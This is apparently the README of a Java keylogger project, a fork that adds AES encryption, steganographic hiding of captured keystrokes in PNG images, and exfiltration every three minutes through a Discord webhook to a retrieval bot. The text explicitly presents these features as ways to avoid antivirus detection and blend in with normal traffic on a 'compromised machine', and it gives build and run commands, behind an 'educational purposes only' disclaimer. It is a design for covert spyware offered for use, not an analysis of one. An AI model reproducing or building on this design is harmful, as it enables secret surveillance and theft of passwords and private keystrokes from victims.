# Java-Keylogger Improved
A powerful and stealth-oriented key logger application written in Java. This fork builds upon the original version using the Native Hook library, with added layers of encryption, steganography, and remote exfiltration.

## Improvements Over the Original Project

### 1. Simple AES Encryption
Before being hidden, keystrokes are encrypted using the AES algorithm. This adds a layer of obfuscation, ensuring that even if the image is extracted by an unauthorized party, the raw input remains unreadable.

### 2. Steganographic Encoding
Encrypted keystrokes are embedded within a .png image, generated from a base image using the following method:

  -Bits of the data are inserted into randomly selected pixels.

  -Slight adjustments are made to the red, green, or blue channels.

  -No visible alteration occurs in the resulting image.

  -An end-of-data marker is appended to simplify future extraction.

Advantages:

  -Visually indistinguishable from the base image.

  -Reduced likelihood of detection by antivirus or heuristic-based systems.

### 3. Discord Webhook Exfiltration
Every 3 minutes, a newly encoded image is generated and automatically uploaded to a Discord channel via webhook.

Advantages:

  -No open ports or suspicious outbound connections.

  -No local text files storing sensitive information.

  -Uses standard HTTPS traffic—blends in with normal usage.

### 4. Discord Retrieval Bot
A custom Discord bot monitors the target channel, and on receiving a new image:

  -Downloads it,

  -Extracts and decodes the hidden payload,

  -Decrypts the keystrokes,

  -Posts them into the designated Discord channel.

This system allows for remote, delayed access to keystrokes without ever directly interacting with the compromised machine.

## How to Build and Run Project
Build project: 
```bash
mvn package
```
Run ./target/keylogger-jar-with-dependencies.jar file using command:
```bash
java -jar ./target/keylogger-jar-with-dependencies.jar
```
## P.S.
Don't forget to stop the key logger application after you've done logging.
This project was made for educational purposes only, use at your own risk.
